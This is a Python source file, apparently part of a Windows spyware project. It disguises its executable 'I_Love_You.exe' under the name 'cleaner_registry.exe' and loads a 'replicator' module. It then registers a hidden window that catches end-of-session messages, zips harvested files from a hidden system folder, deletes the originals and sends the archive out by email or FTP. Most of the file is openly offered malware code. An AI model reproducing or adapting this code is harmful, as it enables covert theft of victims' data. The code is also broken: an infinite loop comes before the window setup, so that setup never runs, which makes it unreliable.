import os
import shutil
import time
from winreg import *

import win32con

import win32api
import win32gui

# Reads the messages from the message map and prints


def wndproc(hwnd, msg, wparam, lparam):
    ctrl = msg
    # Sends email on End of Session
    if ctrl == 17:
        shutil.make_archive('C:\\SYSTEM.SWAV\\Am0ASk2',
                            'zip', 'C:\\SYSTEM.SWAV\\', 'Am0ASk2')
        shutil.rmtree('C:\\SYSTEM.SWAV\\Am0ASk2')
        import sender
        sender.Email()          # Invite files via email
        # sender.FTP()          # Invite files via FTP
    else:
        pass


def keeper():
    import replicator
    # renames I_Love_You.exe to a more convincing name
    fake_name = 'C:\\SYSTEM.SWAV\\cleaner_registry.exe'
    dir = 'C:\\SYSTEM.SWAV\\I_Love_You.exe'
    try:
        os.renames(dir, fake_name)
    except FileNotFoundError:
        pass

    # ---------------------------------- #

    #   Test class
    #   Used to create and test how to grab windows messages
    #   Test "virtually posted" and "real queue" messages
    #   https://devblogs.microsoft.com/oldnewthing/?p=33453

    # ----------------------------------- #

    # Creates invisible console that detects commands

    while True:
        print("Active")
        time.sleep(10)
    hinst = win32api.GetModuleHandle(None)
    wndclass = win32gui.WNDCLASS()
    wndclass.hInstance = hinst
    wndclass.lpszClassName = "CtrlMessage"
    messageMap = {win32con.WM_QUERYENDSESSION: wndproc,  # 17
                  win32con.WM_ENDSESSION: wndproc,  # 22
                  win32con.WM_QUIT: wndproc,  # 18
                  win32con.WM_DESTROY: wndproc,  # 2
                  win32con.WM_CLOSE: wndproc}  # 16

    wndclass.lpfnWndProc = messageMap

    myWindow = win32gui.RegisterClass(wndclass)
    hwnd = win32gui.CreateWindowEx(win32con.WS_EX_LEFT,
                                   myWindow,
                                   "CtrlMessage",
                                   0,
                                   0,
                                   0,
                                   win32con.CW_USEDEFAULT,
                                   win32con.CW_USEDEFAULT,
                                   0,
                                   0,
                                   hinst,
                                   None)

    while True:
        win32gui.PumpWaitingMessages()
        time.sleep(1)
